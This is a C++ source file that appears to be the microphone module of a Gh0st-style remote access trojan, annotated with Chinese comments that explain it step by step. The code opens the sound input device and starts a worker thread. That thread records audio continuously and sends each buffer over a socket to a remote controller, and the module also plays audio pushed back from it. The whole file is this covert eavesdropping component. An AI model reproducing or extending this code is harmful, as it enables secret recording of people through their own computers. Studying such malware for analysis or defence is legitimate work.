#include "AudioManager.h"


bool CAudioManager::m_bIsWorking = false;

CAudioManager::CAudioManager(CClientSocket *pClient) : CManager(pClient)
{
	if (!Initialize())        //初始化
		return;

	BYTE	bToken = TOKEN_AUDIO_START;
	Send(&bToken, 1);
	// Wait for remote dialog open and init
	WaitForDialogOpen();    //等待对话框打开
	//创建工作线程  转到函数定义
	m_hWorkThread = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL);
}


CAudioManager::~CAudioManager()
{
	m_bIsWorking = false;          //设定工作状态为假
	WaitForSingleObject(m_hWorkThread, INFINITE);    //等待 工作线程结束
	delete	m_lpAudio;    //释放分配的对象内存
}


bool CAudioManager::Initialize()
{
	// TODO: 在此处添加实现代码.
	if (!waveInGetNumDevs())   //获取波形输入设备的数目  实际就是看看有没有声卡
		return false;

	// 正在使用中.. 防止重复使用
	if (m_bIsWorking)
		return false;

	m_lpAudio = new CAudio;

	m_bIsWorking = true;
	return true;
	//返回构造函数
}


DWORD WINAPI CAudioManager::WorkThread(LPVOID lparam)
{
	//到现在为止我们还没有看到 录音并得到音频数据的函数呢
	CAudioManager *pThis = (CAudioManager *)lparam;
	while (pThis->m_bIsWorking)
		pThis->sendRecordBuffer();     //一个循环 反复发送数据，我们转到定义看看

	return -1;
}

int CAudioManager::sendRecordBuffer()
{
	// TODO: 在此处添加实现代码.
	//这个函数也很简单 
	DWORD	dwBytes = 0;
	UINT	nSendBytes = 0;
	//这里得到 音频数据
	LPBYTE	lpBuffer = m_lpAudio->getRecordBuffer(&dwBytes);
	if (lpBuffer == NULL)
		return 0;
	//分配缓冲区
	LPBYTE	lpPacket = new BYTE[dwBytes + 1];
	//加入数据头
	lpPacket[0] = TOKEN_AUDIO_DATA;     //记住这个数据头，一会我们会到主控端搜索
	//复制缓冲区
	memcpy(lpPacket + 1, lpBuffer, dwBytes);
	//发送出去
	if (dwBytes > 0)
		nSendBytes = Send(lpPacket, dwBytes + 1);
	delete	lpPacket;

	return nSendBytes;

	//我们没有在这个函数中看到录制音频的代码 ，那录制音频的代码写在那里呢？
	//我们注意到这里得到音频缓冲区的函数getRecordBuffer ，转到他的定义看看
}




void CAudioManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	// TODO: 在此处添加实现代码.
	if (nSize == 1 && lpBuffer[0] == COMMAND_NEXT)
	{
		NotifyDialogIsOpen();
		return;
	}
	m_lpAudio->playBuffer(lpBuffer, nSize);
}
